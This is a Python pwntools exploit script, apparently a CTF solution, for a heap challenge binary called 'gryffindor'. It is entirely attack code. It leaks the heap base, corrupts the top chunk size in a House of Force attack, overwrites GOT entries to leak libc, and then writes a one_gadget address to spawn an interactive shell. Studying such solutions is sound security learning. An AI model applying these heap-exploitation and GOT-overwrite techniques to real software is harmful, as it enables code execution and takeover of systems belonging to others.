#!/usr/bin/env python2

from pwn import *
import os

env = {
	'LD_PRELOAD':os.getcwd()+'/libc.so.6'
}

elf = ELF('./gryffindor')
libc = ELF('./libc.so.6')

p = process(['./ld-2.23.so','./gryffindor'], env = env)
gdb.attach(p, 'init-gef')

table = elf.symbols['table'] # 0x6020e0

# goodguy function to get leaks
def goodguy():
	p.sendlineafter(">> ", '1337')
	leak = int(p.recvline()[:-1],16)
	return leak

def add(index, size):
	p.sendlineafter('>> ', '1')
	p.sendlineafter("Enter size of input\n", str(size))
	p.sendlineafter("Enter index\n", str(index))

def delete(index):
	p.sendlineafter(">> ", '2')
	p.sendlineafter("Enter index\n", str(index))

def edit(index, data):
	p.sendlineafter(">> ", '3')
	p.sendlineafter("Enter index\n", str(index))
	p.sendlineafter("Enter size\n", str(len(data)))
	p.send(data)

heap_base = goodguy() - 0x10

log.success('Heap Base : 0x{:x}'.format(heap_base))

add(1, 0x100)
edit(1, 'A'*0x100 + '\x00' * 8 + '\xff' * 8)

top_chunk = heap_base + 0x110 * 2

# evil_size = victim - top_chunk - 4 * 8

evil_size = (table - top_chunk - 4 * 8)


add(2, evil_size)

add(3, 0x100)

edit(3, '\x00'*8 + p64(table) + p64(elf.got['free']) + p64(elf.got['atoi']))



payload = p64(elf.plt['puts']).replace('\x00','',1)

edit(2, payload)

delete(3)
leak = p.recvline()[:-1]
libc.address = u64(leak.ljust(8,'\x00')) - libc.symbols['atoi']

log.success('Libc : 0x{:x}'.format(libc.address))
 
one_gadget = libc.address + 0xf1117

payload = p64(one_gadget)[:-1]
edit(2, payload)
delete(1)


p.interactive()
